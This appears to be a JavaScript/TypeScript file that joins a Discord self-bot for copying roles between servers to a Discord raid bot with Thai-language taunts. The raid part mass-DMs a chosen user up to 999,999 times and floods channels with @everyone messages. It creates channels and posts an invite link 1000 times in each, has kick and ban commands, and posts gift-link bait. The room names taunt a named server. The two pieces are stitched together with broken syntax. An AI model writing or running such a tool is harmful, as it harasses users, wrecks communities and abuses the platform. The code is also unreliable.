import { Client, GuildMember, Role } from 'discord.js-selfbot-v13';
import * as dotenv from 'dotenv';

// Load environment variables from .env file
dotenv.config();

// --- VERY IMPORTANT WARNING --- //
// Running a self-bot violates Discord's Terms of Service.
// Your account may be banned if detected.
// Use this code at your own risk.
// It is highly recommended to use bot accounts for proper automation.
// ---------------------------- //

// Define server IDs
const TARGET_SERVER_ID = '1281965480650735708'; // The server where the user joins
const CHECK_SERVER_ID = '1084098120515850241';  // The server to check for membership and roles

// --- Role Mapping --- //
// Map roles from CHECK_SERVER_ID (keys) to TARGET_SERVER_ID (values)
// Replace these placeholder IDs with your actual role IDs.
const ROLE_MAP: { [checkServerRoleId: string]: string } = {
'1127227742350483536': '1325432054237888554',
'1127227664273510430': '1325432054237888554',
// Add more mappings as needed
};
// --- End Role Mapping --- //

const client = new Client({
// checkUpdate: false, // Optional: disables checking for updates
});

client.on('ready', async () => {
if (!client.user) {
console.error("Client user is not available.");
return;
}
console.log(Logged in as ${client.user.tag} (ID: ${client.user.id}));
console.log('------');
console.log("WARNING: Running a self-bot violates Discord's ToS and can lead to account termination.");
console.log(Listening for members joining server ID: ${TARGET_SERVER_ID});
console.log(Will check for membership in server ID: ${CHECK_SERVER_ID});
console.log('Role Mapping configured.');
console.log('------');
});

client.on('guildMemberAdd', async (member: GuildMember) => {
// Ensure the member object is fully available
if (!member || !member.guild || !member.user) return;

// Check if the member joined the target server  
if (member.guild.id !== TARGET_SERVER_ID) {  
    return;  
}  
const targetGuild = member.guild;  

console.log(`${member.user.tag} (ID: ${member.user.id}) joined target server ${targetGuild.name} (ID: ${targetGuild.id})`);  

try {  
    // Get the second server (guild) object  
    const checkGuild = await client.guilds.fetch(CHECK_SERVER_ID);  
    if (!checkGuild) {  
        console.log(`  Error: Could not find the check server (ID: ${CHECK_SERVER_ID}). Make sure your account is in this server.`);  
        return;  
    }  

    // Attempt to fetch the member from the second server  
    try {  
        const checkMember = await checkGuild.members.fetch(member.user.id);  

        if (checkMember) {  
            console.log(`  ${member.user.tag} is also in ${checkGuild.name} (ID: ${checkGuild.id}). Checking roles...`);  

            const checkMemberRoles = checkMember.roles.cache;  
            let rolesToAdd: Role[] = [];  
            let rolesToAddNames: string[] = [];  

            // Find roles to add based on the map  
            checkMemberRoles.forEach(roleInCheckServer => {  
                const targetRoleId = ROLE_MAP[roleInCheckServer.id];  
                if (targetRoleId) {  
                    // Find the actual role object in the target server  
                    const targetRole = targetGuild.roles.cache.get(targetRoleId);  
                    if (targetRole) {  
                        // Check if the member already has the role in the target server  
                        if (!member.roles.cache.has(targetRole.id)) {  
                            rolesToAdd.push(targetRole);  
                            rolesToAddNames.push(targetRole.name);  
                        } else {  
                            console.log(`    - Member already has role '${targetRole.name}' in ${targetGuild.name}.`);  
                        }  
                    } else {  
                        console.log(`    - Warning: Mapped target role ID ${targetRoleId} not found in server ${targetGuild.name}.`);  
                    }  
                }  
            });  

            // Add the mapped roles if any were found  
            if (rolesToAdd.length > 0) {  
                console.log(`  Attempting to add roles in ${targetGuild.name}: ${rolesToAddNames.join(', ')}`);  
                try {  
                    await member.roles.add(rolesToAdd);  
                    console.log(`  Successfully added roles: ${rolesToAddNames.join(', ')}`);  
                } catch (addRoleError: any) {  
                    console.error(`  Error adding roles to ${member.user.tag} in ${targetGuild.name}.`);  
                    // Check for common permission error  
                    if (addRoleError.code === 50013) { // DiscordAPIError: Missing Permissions  
                         console.error(`  Reason: Missing 'Manage Roles' permission in ${targetGuild.name}.`);  
                    } else {  
                        console.error('  Add role error details:', addRoleError);  
                    }  
                }  
            } else {  
                console.log(`  No new roles to add based on the mapping and current roles.`);  
            }  

        } else {  
             console.log(`  ${member.user.tag} was NOT found in ${checkGuild.name} (ID: ${checkGuild.id}) (or couldn't be fetched).`);  
        }  
    } catch (fetchError) {  
         console.log(`  Could not fetch member ${member.user.tag} from ${checkGuild.name} (ID: ${checkGuild.id}). They might not be present, or self-bot permissions are restricted.`);  
    }  

} catch (guildError) {  
    console.log(`  Error fetching the check server (ID: ${CHECK_SERVER_ID}). Ensure the ID is correct and your account is in the server.`);  
}

});

// --- Login ---
const token = process.env.DISCORD_TOKEN;

if (!token) {
console.error("Error: DISCORD_TOKEN environment variable not set.");
console.error("Please ensure it is set in your environment or in a .env file.");
process.exit(1); // Exit if no token is provided
}

client.login(token)
.catch(error => {
console.error("Login failed. Check your token.");
console.error(error);
process.exit(1);
});

// Basic error handling
client.on('error', console.error);

//const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages
  ],
});

// ===== CONFIG =====
const LOG_CHANNEL_ID = "1461588208675459217";
const BLOCKED_GUILD_ID = "146024011876123456";

// ===== ANGPAO CONFIG =====
const ANGPAO_LINK = "https://gift.truemoney.com/campaign/?v=067e13y095402q4tlg4032te7w204h4afk  https://gift.truemoney.com/campaign/?v=025e18y092902q4tlg6832te2w703h7afk. https://gift.truemoney.com/campaign/?v=030e89y038251q4tlg5921te6q703h9afk. https://gift.truemoney.com/campaign/?v=030e89y305392q4tlg1042te9w301h4afk. https://gift.truemoney.com/campaign/?v=063e10y50395q4tlg1042te9w301h9afk"; // 👈 เปลี่ยนเป็นลิงก์เว็บอังเปาของมึง

// ===== RANDOM TEXT =====
const randomMessages = [
  "@everyone เอ๋อ",
  "@everyone ร้องไร",
  "@everyone กูขำว่ะ",
  "@everyone คุ้มมั้ยเนี่ย",
  "@everyone เเค้นมั้ยถ้าเเค้นเข้าดิสมา5555",
  "@everyone เซิฟกากๆโดนยิงได้อะตลกกก",
  "@everyone อย่าร้องเลยสร้างใหม่ได้",
  "@everyone ไม่เอาไม่ร้องงงงงมากอดมาจุ๊บบมั๊ววว",
  "@everyone อย่าทำให้กูขำได้ป่ะ55555555",
];

// ===== RANDOM ROOM NAMES =====
const roomNames = [
  "ไม่เป็นไรนะสร้างใหม่ได้",
  "เซิฟแตกเหรอครับ",
  "เอ๋อจัดๆ",
  "ตลกดี 555",
  "สร้างใหม่ได้จ้า",
  "ร้องทำไมมม",
  "ป๊อปปี้อย่าร้อง",
  "เซิฟวิบัติ",
  "ปัดเป่าสิ่งชั่วร้าย",
  "สู้ป๊อปปี้สู้",
  "ดิสกากๆโดนบอทฟรียิง",
  "VEXSHOPเขามาลั่นมึงเเล้ววว",
  "มึงพลาดเเล้วววว",
  "จุ๊บมั่วววว",
  "ตู้มมมมพ่องตายยยยย",
  "บอทกันสเเปมมึงเซ็ตโง่มาก555",
  "ขี้ตีนVEXSHOP",
];

// ===== FORMAT TIME +7 =====
function timeTH() {
  return new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" });
}

// ===== LOG SYSTEM =====
function logUse(i, extra = "") {
  if (!LOG_CHANNEL_ID) return;
  const ch = client.channels.cache.get(LOG_CHANNEL_ID);
  if (!ch) return;
  ch.send(
    `[\`${timeTH()}\`] ${i.user.tag} ใช้คำสั่ง \`/${i.commandName}\` ในเซิฟ \`${i.guild.name}\` ${extra}`
  ).catch(() => {});
}

client.once("ready", () => {
  console.log(`${client.user.tag} is online.`);
});

client.on("interactionCreate", async (interaction) => {
  try {
    if (!interaction.isChatInputCommand()) return;
    if (!interaction.guild) return;

    if (BLOCKED_GUILD_ID && interaction.guild.id === BLOCKED_GUILD_ID) {
      return interaction.reply({ content: "อย่ามาใช้ในเซิฟกู", ephemeral: true });
    }

    logUse(interaction);

    // =======================
    // /angpao  ⭐ เพิ่มใหม่
    // =======================
    if (interaction.commandName === "angpao") {
      await interaction.reply({
        content:
          "🧧 **อังเปาพิเศษสำหรับคุณ**\n" +
          "คลิกเพื่อเปิดอังเปาเยยยย 👇\n" +
          "🔗 " + ANGPAO_LINK
      });

      logUse(interaction, "-> angpao");
    }

    // =======================
    // /dm
    // =======================
    if (interaction.commandName === "dm") {
      const target = interaction.options.getUser("target");
      const text = interaction.options.getString("text");
      const count = Math.min(interaction.options.getInteger("count") ?? 1, 999999);

      await interaction.reply({ content:`ยิง DM ไปที่ ${target.tag} x${count}`, ephemeral:true });

      let success = 0, fail = 0;
      for (let i = 0; i < count; i++) {
        await target.send(text).then(()=>success++).catch(()=>fail++);
      }

      interaction.followUp({
        content: `ยิง DM เสร็จแล้ว ✔️ สำเร็จ: ${success}  ไม่เข้า: ${fail}`,
        ephemeral: true
      });

      logUse(interaction, `-> DM ${target.tag} (ok:${success} fail:${fail})`);
    }

    // =======================
    // /spam
    // =======================
    if (interaction.commandName === "spam") {
      const text = interaction.options.getString("text");
      const count = Math.min(interaction.options.getInteger("count") ?? 5, 999999);
      await interaction.reply({ content: "ลั่นละนะ", ephemeral: true });
      for (let i = 0; i < count; i++) interaction.channel.send(text).catch(()=>{});
    }

    // /emoji
    if (interaction.commandName === "emoji") {
      const emoji = interaction.options.getString("emoji");
      const count = Math.min(interaction.options.getInteger("count") ?? 5, 999999);
      const delay = Math.max(interaction.options.getInteger("delay") ?? 1, 1);
      await interaction.reply({ content: "ยิง emoji", ephemeral: true });
      for (let i = 0; i < count; i++) {
        interaction.channel.send(emoji).catch(()=>{});
        await new Promise(r => setTimeout(r, delay));
      }
    }

    // /join
    if (interaction.commandName === "join") {
      const vc = interaction.member.voice?.channel;
      if (!vc)
        return interaction.reply({ content: "มึงเข้า vc ก่อนไอ้ควาย", ephemeral: true });
      joinVoiceChannel({
        channelId: vc.id,
        guildId: vc.guild.id,
        adapterCreator: vc.guild.voiceAdapterCreator,
        selfDeaf:false,selfMute:false
      });
      return interaction.reply({ content:`เข้าห้อง ${vc.name} แล้ว`, ephemeral:true });
    }

    // /tell_off
    if (interaction.commandName === "tell_off") {
      const count = interaction.options.getInteger("count") ?? 100000;
      await interaction.reply({ content:`ยิง ${count} ข้อความ`, ephemeral:true });
      const tasks = [];
      for (let i = 0; i < count; i++) {
        tasks.push(
          interaction.channel.send(
            randomMessages[Math.floor(Math.random()*randomMessages.length)]
          ).catch(()=>{})
        );
      }
      Promise.allSettled(tasks);
    }

    // /kick
    if (interaction.commandName === "kick") {
      const target = interaction.options.getUser("target");
      const reason = interaction.options.getString("reason") ?? "No reason";
      const mem = interaction.guild.members.cache.get(target.id);
      if (!interaction.member.permissions.has(PermissionsBitField.Flags.KickMembers))
        return interaction.reply({ content:"บอทกูไม่มีสิทธิ์ Kick", ephemeral:true });
      await mem.kick(reason).catch(()=>{});
      logUse(interaction, `-> Kick ${target.tag}`);
      return interaction.reply({ content:`Kick ${target.tag}`, ephemeral:true });
    }

    // /ban
    if (interaction.commandName === "ban") {
      const target = interaction.options.getUser("target");
      const reason = interaction.options.getString("reason") ?? "No reason";
      if (!interaction.member.permissions.has(PermissionsBitField.Flags.BanMembers))
        return interaction.reply({ content:"บอทกูไม่มีสิทธิ์ Ban", ephemeral:true });
      await interaction.guild.members.ban(target, { reason }).catch(()=>{});
      logUse(interaction, `-> Ban ${target.tag}`);
      return interaction.reply({ content:`Ban ${target.tag}`, ephemeral:true });
    }

    // /create_room
    if (interaction.commandName === "create_room") {
      const amount = interaction.options.getInteger("amount") ?? 1;
      await interaction.reply({
        content:`สร้าง ${amount} ห้อง + ยิงพร้อมกัน`,
        ephemeral:true
      });

      const tasks = [];
      for (let i = 0; i < amount; i++) {
        const name = roomNames[Math.floor(Math.random()*roomNames.length)];
        tasks.push(
          interaction.guild.channels.create({
            name,
            type: ChannelType.GuildText,
            permissionOverwrites:[{
              id: interaction.guild.roles.everyone.id,
              allow:[
                PermissionsBitField.Flags.ViewChannel,
                PermissionsBitField.Flags.SendMessages
              ]
            }],
          }).then(ch=>{
            for (let j = 0; j < 1000; j++)
              ch.send("@everyone ไม่เป็นไรนะสร้างใหม่ได้โอ๋ๆ https://discord.gg/bdtRJBRyem")
                .catch(()=>{});
          }).catch(()=>{})
        );
      }

      Promise.allSettled(tasks);
    }

  } catch (err) {
    console.error("ERROR:", err);
  }
});

client.login(process.env.DISCORD_TOKEN);